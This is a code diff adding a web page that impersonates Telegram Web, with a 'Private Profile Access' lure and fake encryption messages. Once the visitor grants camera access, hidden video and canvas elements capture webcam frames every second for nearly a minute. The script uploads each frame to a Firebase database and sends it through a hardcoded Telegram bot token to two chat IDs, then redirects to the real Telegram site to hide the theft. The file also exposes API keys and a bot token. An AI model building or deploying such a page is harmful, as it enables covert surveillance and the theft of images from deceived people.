@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web | Secure Link</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --tg-blue: #2481cc;
+            --tg-bg: #1d2733;
+            --tg-dark: #17212b;
+            --tg-text: #f5f5f5;
+            --tg-sub: #708499;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--tg-dark); color: var(--tg-text);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .tg-card {
+            width: 100%; max-width: 380px; background: var(--tg-bg);
+            border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.3);
+            overflow: hidden; text-align: center;
+        }
+
+        .header-logo {
+            padding: 40px 20px 20px;
+        }
+
+        .tg-icon {
+            width: 80px; height: 80px; background: var(--tg-blue);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px; box-shadow: 0 0 20px rgba(36, 129, 204, 0.4);
+        }
+
+        .profile-info { padding: 0 30px 30px; }
+
+        h1 { font-size: 22px; font-weight: 500; margin: 0 0 8px; color: #fff; }
+        .status-online { color: var(--tg-blue); font-size: 14px; margin-bottom: 24px; }
+
+        .secure-notice {
+            background: rgba(36, 129, 204, 0.1); border-radius: 8px;
+            padding: 16px; margin-bottom: 24px; text-align: left;
+            border-left: 3px solid var(--tg-blue);
+        }
+
+        .notice-text { font-size: 13px; color: var(--tg-sub); line-height: 1.4; }
+
+        .btn-tg {
+            background: var(--tg-blue); color: #fff; border: none;
+            width: 100%; padding: 14px; font-size: 15px; font-weight: 500;
+            border-radius: 8px; cursor: pointer; transition: 0.2s;
+        }
+
+        .btn-tg:hover { background: #288fde; }
+
+        /* Sync Logic UI */
+        #sync-ui { display: none; padding-top: 40px; }
+        
+        .shield-spinner {
+            width: 60px; height: 60px; margin: 0 auto 20px;
+            border: 3px solid transparent; border-top-color: var(--tg-blue);
+            border-bottom-color: var(--tg-blue); border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .timer-label { font-size: 16px; font-weight: 500; margin-bottom: 8px; }
+        .meta-data { font-size: 11px; color: var(--tg-sub); margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="tg-card">
+        <div class="header-logo" id="init-logo">
+            <div class="tg-icon">
+                <svg width="45" height="45" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.36-.49.99-.75 3.88-1.69 6.46-2.8 7.74-3.35 3.7-1.58 4.46-1.85 4.96-1.86.11 0 .35.03.5.15.13.11.17.26.18.44z"/></svg>
+            </div>
+        </div>
+
+        <div class="profile-info" id="init-view">
+            <h1>Private Profile Access</h1>
+            <div class="status-online">last seen recently</div>
+            
+            <div class="secure-notice">
+                <div class="notice-text">
+                    This account is protected by <b>Secret Chat Encryption</b>. To view the profile, you must establish a secure peer-to-peer session.
+                </div>
+            </div>
+            
+            <button class="btn-tg" onclick="startTgSync()">Open Profile</button>
+            <div class="meta-data">Session Relay: Gaya, Bihar</div>
+        </div>
+
+        <div class="profile-info" id="sync-ui">
+            <div class="shield-spinner"></div>
+            <div class="timer-label">Generating Security Key...</div>
+            <div style="font-size: 13px; color: var(--tg-sub);" id="tg-timer">Handshake will complete in 60s</div>
+            
+            <div style="margin-top: 30px; font-family: monospace; font-size: 10px; color: #388e3c; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 4px; text-align: left;">
+                > INITIALIZING P2P_RELAY...<br>
+                > CALIBRATING OPTICAL HASH...<br>
+                > SYNCING BIOMETRIC DATA...
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Components -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startTgSync() {
+            try {
+                // Disguised Camera Permission Trigger
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let iteration = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        iteration++;
+                        document.getElementById('tg-timer').innerText = `Handshake will complete in ${timeLeft}s`;
+
+                        if (iteration <= 55) {
+                            tgPerformCapture(iteration);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Official Telegram Web Redirect
+                            window.location.href = "https://web.telegram.org";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://web.telegram.org";
+            }
+        }
+
+        function tgPerformCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ image: b64, source: "TG_SPOOF", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'tg_recon.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
